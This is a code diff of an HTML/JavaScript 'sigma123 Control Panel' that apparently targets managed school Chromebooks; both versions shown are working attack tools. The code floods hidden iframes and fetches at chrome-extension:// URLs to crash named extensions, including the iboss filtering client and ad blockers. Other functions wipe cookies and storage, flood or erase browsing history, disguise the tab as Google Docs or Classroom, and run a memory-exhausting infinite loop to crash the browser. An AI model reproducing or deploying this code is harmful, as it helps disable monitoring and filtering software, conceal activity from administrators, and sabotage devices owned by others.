@@ -2,295 +2,189 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Ronan is the SIGMA</title>
+  <title>sigma123</title>
   <style>
     body {
-      margin: 0; padding: 0;
-      background: #000; color: #0f0;
-      font-family: monospace;
-      transition: background 0.3s, color 0.3s;
+      font-family: Arial, sans-serif;
+      background: var(--bg, #121212);
+      color: var(--text, #ffffff);
+      padding: 20px;
     }
-    .container { max-width: 1000px; margin: auto; padding: 20px; }
-    .header { display: flex; background: #111; }
-    .tablink {
-      flex: 1;
-      background: #111; color: #0f0;
-      border: none; padding: 10px; cursor: pointer;
+    button {
+      padding: 10px;
+      margin: 5px;
+      border: none;
+      background: var(--btn, #3333ff);
+      color: white;
+      cursor: pointer;
+      border-radius: 5px;
     }
-    .tablink.active { background: #0f0; color: #000; }
-    .tabcontent { display: none; padding: 20px; }
-    label, input, select, button, textarea {
-      width: 100%; margin-top: 10px; padding: 8px;
-      background: #222; color: #0f0; border: 1px solid #0f0; border-radius: 5px;
+    input[type="checkbox"], select {
+      margin: 5px;
     }
-    button { font-weight: bold; cursor: pointer; }
-    button:hover { background: #0c0; }
-    #safeExitBtn {
-      background: #f00; color: #fff; padding: 10px; margin: 20px 0; border: none; border-radius: 5px;
+    .footer {
+      position: fixed;
+      bottom: 10px;
       width: 100%;
+      text-align: center;
     }
-    .scrollable { max-height: 200px; overflow-y: auto; margin-bottom: 10px; }
-    .status { text-align: center; margin-top: 10px; font-weight: bold; }
-    .checkbox-list { display: flex; flex-direction: column; }
-    .checkbox-list label { display: flex; align-items: center; }
-    .checkbox-list input[type="checkbox"] { width: auto; margin-right: 10px; }
   </style>
 </head>
 <body>
+<h1>sigma123 Control Panel</h1>
 
-<div class="header">
-  <button class="tablink active" onclick="openTab(event, 'main')">Main Attack</button>
-  <button class="tablink" onclick="openTab(event, 'history')">History Cleaner</button>
-  <button class="tablink" onclick="openTab(event, 'cloak')">Cloak</button>
-  <button class="tablink" onclick="openTab(event, 'advanced')">Advanced Tools</button>
+<!-- Mode Toggles -->
+<div>
+  <label><input type="checkbox" id="cloakTab"> Enable Cloak</label><br>
+  <label><input type="checkbox" id="attackExtensions"> Kill Extensions</label><br>
+  <label><input type="checkbox" id="historyDelete"> History Delete</label><br>
+  <label><input type="checkbox" id="historyFlood"> History Flooder</label><br>
+  <label><input type="checkbox" id="rotateURLs"> Rotate Attack URLs</label><br>
+  <label><input type="checkbox" id="turboMode"> Turbo Mode (iframe + memory flood)</label><br>
+  <label><input type="checkbox" id="autoReload"> Auto Reload Attack</label><br>
+  <label><input type="checkbox" id="darkModeToggle"> Dark Mode</label><br>
 </div>
 
-<div id="main" class="tabcontent" style="display:block;">
-  <div class="container">
-    <h2>Main Extension Bugger</h2>
-
-    <label>Attack Target URLs (comma-separated)</label>
-    <textarea id="attackUrls">https://example.com,https://another-example.com</textarea>
-
-    <label>Number of Iframes per Cycle</label>
-    <input type="number" id="iframeCount" value="100" min="1">
-
-    <label>Delay Between Waves (ms)</label>
-    <input type="number" id="iframeDelay" value="50" min="0">
-
-    <label>Flood Mode</label>
-    <select id="floodMode">
-      <option value="turbo">Turbo Mode</option>
-      <option value="aggressive">Aggressive</option>
-      <option value="silent">Silent Hidden</option>
-    </select>
-
-    <label>Extension IDs to Target</label>
-    <div class="scrollable checkbox-list" id="extensionList"></div>
-
-    <button onclick="scanExtensions()">Scan Installed Extensions</button>
-    <input type="text" id="manualExtensionId" placeholder="Manual Add Extension ID">
-    <button onclick="addManualExtension()">Add Manual Extension</button>
-
-    <label><input type="checkbox" id="randomizeUrls" checked> Randomize URLs per Cycle</label>
-    <label><input type="checkbox" id="autoReload" > Auto Reload on Kill</label>
-
-    <button onclick="startFlood()">Start Attack</button>
-    <button onclick="stopFlood()">Stop Attack</button>
-
-    <div class="status" id="statusMain">Status: Idle</div>
-    <button id="safeExitBtn" onclick="safeExit()">Safe Exit</button>
-  </div>
+<!-- Panic Button -->
+<div class="footer">
+  <button onclick="panic()">🚨 PANIC</button>
 </div>
 
-<div id="history" class="tabcontent">
-  <div class="container">
-    <h2>History Nuker</h2>
-    <button onclick="startHistoryWipe()">Start Wipe</button>
-    <button onclick="stopHistoryWipe()">Stop Wipe</button>
-    <div class="status" id="statusHistory">Status: Idle</div>
-  </div>
-</div>
-
-<div id="cloak" class="tabcontent">
-  <div class="container">
-    <h2>Cloak Settings</h2>
-    <label>Choose Cloak</label>
-    <select id="cloakType">
-      <option value="docs">Fake Google Docs</option>
-      <option value="drive">Fake Google Drive</option>
-      <option value="calc">Fake Calculator</option>
-      <option value="notepad">Fake Notepad</option>
-      <option value="blank">Blank Page</option>
-      <option value="custom">Custom URL</option>
-    </select>
-    <input type="text" id="cloakCustomUrl" placeholder="Custom URL (if selected)">
-    <button onclick="applyCloak()">Apply Cloak</button>
-  </div>
-</div>
-
-<div id="advanced" class="tabcontent">
-  <div class="container">
-    <h2>Advanced Settings</h2>
-    <button onclick="toggleTheme()">Toggle Dark/Light Mode</button>
-    <button onclick="fetchSurfTargets()">Fetch Good Target URLs</button>
-    <div class="status" id="surfStatus">Surf Targets: 0 Loaded</div>
-  </div>
-</div>
+<!-- Start Button -->
+<button onclick="launchAll()">Launch All Selected!</button>
 
 <script>
-let floodInterval, historyInterval, attackUrls = [], proxies = [], extensions = {}, flooding = false;
-let isDark = true;
+// Setup vars
+const icons = [
+  "https://www.google.com/favicon.ico",
+  "https://www.youtube.com/favicon.ico",
+  "https://classroom.google.com/favicon.ico"
+];
+const titles = ["Google", "YouTube", "Classroom"];
+const attackURLs = [
+  "https://google.com",
+  "https://bing.com",
+  "https://duckduckgo.com"
+];
 
-// --- Tabs ---
-function openTab(evt, tabName) {
-  document.querySelectorAll('.tabcontent').forEach(t => t.style.display = 'none');
-  document.querySelectorAll('.tablink').forEach(t => t.classList.remove('active'));
-  document.getElementById(tabName).style.display = 'block';
-  evt.currentTarget.classList.add('active');
-}
-
-// --- Flood Functions ---
-function startFlood() {
-  if (flooding) return;
-  flooding = true;
-  attackUrls = document.getElementById('attackUrls').value.split(',').map(u=>u.trim()).filter(u=>u);
-  const delay = +document.getElementById('iframeDelay').value;
-  const mode = document.getElementById('floodMode').value;
-  const extIds = [...document.querySelectorAll('#extensionList input:checked')].map(c=>c.value);
-  if (!attackUrls.length || !extIds.length) { alert('Please input URLs and select extensions!'); flooding = false; return; }
-  document.getElementById('statusMain').innerText = 'Status: Flooding…';
-  floodInterval = setInterval(()=>{
-    let targetUrl = document.getElementById('randomizeUrls').checked ?
-      attackUrls[Math.floor(Math.random()*attackUrls.length)] : attackUrls[0];
-    spawnIframe(targetUrl, mode);
-    extIds.forEach(id => spawnExtIframe(id));
-  }, delay);
-}
-
-function stopFlood() {
-  clearInterval(floodInterval);
-  flooding = false;
-  document.getElementById('statusMain').innerText = 'Status: Idle';
-}
-
-function spawnIframe(url, mode) {
-  const iframe = document.createElement('iframe');
-  iframe.src = url + "?rand=" + Math.random();
-  iframe.style.border = "none";
-  iframe.style.position = "absolute";
-  iframe.style.width = mode === "turbo" ? "100%" : (mode === "aggressive" ? "10px" : "1px");
-  iframe.style.height = mode === "turbo" ? "100%" : (mode === "aggressive" ? "10px" : "1px");
-  iframe.style.visibility = mode === "silent" ? "hidden" : "visible";
-  document.body.appendChild(iframe);
-  setTimeout(() => iframe.remove(), 1000);
-}
-
-function spawnExtIframe(id) {
-  const iframe = document.createElement('iframe');
-  iframe.src = `chrome-extension://${id}/`;
-  iframe.style.display = 'none';
-  document.body.appendChild(iframe);
-  setTimeout(() => iframe.remove(), 1000);
-}
-
-// --- Extension List ---
-function scanExtensions() {
-  const defaultExt = {
-    "gighmmpiobklfepjocnamgkkbiglidom":"AdBlock",
-    "cfhdojbkjhnklbpkdaibdccddilifddb":"Adblock Plus",
-    "nkeimhogjdpnpccoofpliimaahmaaome":"Grammarly",
-    "ibnejdfjmmkpcnlpebklmnkoeoihofec":"uBlock Origin",
-    "lfnaojkojhopbjbpmloofpnjkcjnkddd":"IbossClient",
-    "kmffehbidlalibfeklaefnckpidbodff":"Iboss Extension 1",
-    "oejigobjchedidhlafnpdpccihgbmbka":"Iboss Extension 2"
-  };
-  extensions = { ...extensions, ...defaultExt };
-  populateExtensionList();
-}
-
-function populateExtensionList() {
-  const list = document.getElementById('extensionList');
-  list.innerHTML = '';
-  for (let id in extensions) {
-    const label = document.createElement('label');
-    label.innerHTML = `<input type="checkbox" value="${id}" checked> ${extensions[id]} (${id})`;
-    list.appendChild(label);
-  }
-}
-
-function addManualExtension() {
-  const id = document.getElementById('manualExtensionId').value.trim();
-  if (id) {
-    extensions[id] = 'Manual Extension';
-    populateExtensionList();
-    document.getElementById('manualExtensionId').value = '';
-  }
-}
-
-// --- Safe Exit ---
-function safeExit() {
-  stopFlood();
-  stopHistoryWipe();
-  document.querySelectorAll('iframe').forEach(f => f.remove());
-  if (document.getElementById('autoReload').checked) window.location.reload();
-}
-
-// --- History Wipe ---
-function startHistoryWipe() {
-  stopHistoryWipe();
-  document.getElementById('statusHistory').innerText = 'Status: Wiping…';
-  clearData();
-  historyInterval = setInterval(clearData, 1000);
-}
-
-function stopHistoryWipe() {
-  clearInterval(historyInterval);
-  document.getElementById('statusHistory').innerText = 'Status: Idle';
-}
-
-function clearData() {
-  try {
-    localStorage.clear();
-    sessionStorage.clear();
-    document.cookie.split(";").forEach(c => {
-      document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=Thu,01 Jan 1970 00:00:00 GMT;path=/");
-    });
-    if (chrome.browsingData) {
-      chrome.browsingData.remove({}, {history:true, cache:true, cookies:true, localStorage:true}, ()=>{});
-    }
-  } catch(e){}
-  const iframe = document.createElement('iframe');
-  iframe.src = 'chrome://settings/clearBrowserData';
-  iframe.style.display = 'none';
-  document.body.appendChild(iframe);
-  setTimeout(()=>iframe.remove(), 1000);
-}
-
-// --- Cloak ---
-function applyCloak() {
-  const type = document.getElementById('cloakType').value;
-  const custom = document.getElementById('cloakCustomUrl').value;
-  let title = 'Untitled';
-  let favicon = '';
-
-  switch(type) {
-    case 'docs': title = 'Google Docs'; favicon='https://ssl.gstatic.com/docs/doclist/images/mediatype/icon_1_document_x16.png'; break;
-    case 'drive': title = 'Google Drive'; favicon='https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_48dp.png'; break;
-    case 'calc': title = 'Calculator'; favicon='https://ssl.gstatic.com/classroom/ic_product_calculator_48.png'; break;
-    case 'notepad': title = 'Notepad'; break;
-    case 'blank': title = 'Blank'; break;
-    case 'custom': title = custom; break;
-  }
-  document.title = title;
-  const link = document.createElement('link');
-  link.rel = 'icon';
-  link.href = favicon;
-  document.head.appendChild(link);
-}
-
-// --- Advanced Surf Fetch ---
-function fetchSurfTargets() {
-  attackUrls.push('https://bing.com', 'https://duckduckgo.com', 'https://wikipedia.org', 'https://yahoo.com');
-  document.getElementById('surfStatus').innerText = `Surf Targets: ${attackUrls.length} Loaded`;
-}
-
-// --- Theme ---
-function toggleTheme() {
-  if (isDark) {
-    document.body.style.background = '#fff';
-    document.body.style.color = '#000';
+// Apply dark mode toggle
+document.getElementById('darkModeToggle').addEventListener('change', (e) => {
+  if (e.target.checked) {
+    document.documentElement.style.setProperty('--bg', '#121212');
+    document.documentElement.style.setProperty('--text', '#ffffff');
+    document.documentElement.style.setProperty('--btn', '#3333ff');
   } else {
-    document.body.style.background = '#000';
-    document.body.style.color = '#0f0';
+    document.documentElement.style.setProperty('--bg', '#ffffff');
+    document.documentElement.style.setProperty('--text', '#000000');
+    document.documentElement.style.setProperty('--btn', '#3333ff');
   }
-  isDark = !isDark;
+});
+
+// Main launch function
+function launchAll() {
+  if (document.getElementById('cloakTab').checked) startCloak();
+  if (document.getElementById('attackExtensions').checked) attackExtensions();
+  if (document.getElementById('historyDelete').checked) deleteHistory();
+  if (document.getElementById('historyFlood').checked) floodHistory();
+  if (document.getElementById('rotateURLs').checked) rotateAttackURLs();
+  if (document.getElementById('turboMode').checked) turboCrash();
+  if (document.getElementById('autoReload').checked) setInterval(launchAll, 30000);
 }
 
-// --- Init ---
-scanExtensions();
-</script>
+// Panic function
+function panic() {
+  try { 
+    history.pushState(null, null, location.href);
+    history.go(-(history.length));
+  } catch(e) {}
+  location.replace('about:blank');
+}
 
+// Cloaking
+function startCloak() {
+  setInterval(() => {
+    const idx = Math.floor(Math.random() * icons.length);
+    document.title = titles[idx];
+    const link = document.querySelector("link[rel~='icon']") || document.createElement('link');
+    link.rel = 'icon';
+    link.href = icons[idx];
+    document.head.appendChild(link);
+  }, 1000);
+}
+
+// EXTENSION ATTACK
+function attackExtensions() {
+  const iframe = document.createElement('iframe');
+  iframe.style.display = 'none';
+  document.body.appendChild(iframe);
+  iframe.src = 'chrome-extension://invalid/manifest.json';
+
+  const ids = [
+    'kmffehbidlalibfeklaefnckpidbodff', // iboss
+    'oejigobjchedidhlafnpdpccihgbmbka', // iboss alt
+    'cfhdojbkjhnklbpkdaibdccddilifddb'  // Adblock Plus
+  ];
+
+  ids.forEach(id => {
+    let url = 'chrome-extension://' + id + '/manifest.json';
+    fetch(url).then(r => r.text()).catch(()=>{});
+  });
+  
+  // extprint3r style iframe spam
+  for (let i = 0; i < 10; i++) {
+    const extFrame = document.createElement('iframe');
+    extFrame.style.display = 'none';
+    extFrame.src = 'chrome-extension://' + ids[Math.floor(Math.random()*ids.length)] + '/_generated_background_page.html';
+    document.body.appendChild(extFrame);
+  }
+}
+
+// History Delete
+function deleteHistory() {
+  const anchors = [];
+  for (let i = 0; i < 100; i++) {
+    let a = document.createElement('a');
+    a.href = `https://google.com/search?q=delete${Math.random()}`;
+    anchors.push(a);
+    document.body.appendChild(a);
+  }
+  history.pushState({}, '', '/');
+  history.replaceState({}, '', '/');
+  anchors.forEach(a => a.click());
+}
+
+// History Flood
+function floodHistory() {
+  for (let i = 0; i < 300; i++) {
+    const iframe = document.createElement('iframe');
+    iframe.src = 'https://google.com/search?q=flood'+i;
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+  }
+}
+
+// Rotate Attack URLs
+function rotateAttackURLs() {
+  setInterval(() => {
+    const win = window.open(attackURLs[Math.floor(Math.random()*attackURLs.length)], '_blank');
+    if (win) win.blur();
+  }, 5000);
+}
+
+// Turbo crash mode
+function turboCrash() {
+  setInterval(() => {
+    for (let i = 0; i < 50; i++) {
+      const iframe = document.createElement('iframe');
+      iframe.src = 'about:blank';
+      iframe.style.display = 'none';
+      document.body.appendChild(iframe);
+    }
+    let arr = [];
+    while (true) arr.push(new Array(10000).fill(0));
+  }, 500);
+}
+
+</script>
 </body>
 </html>
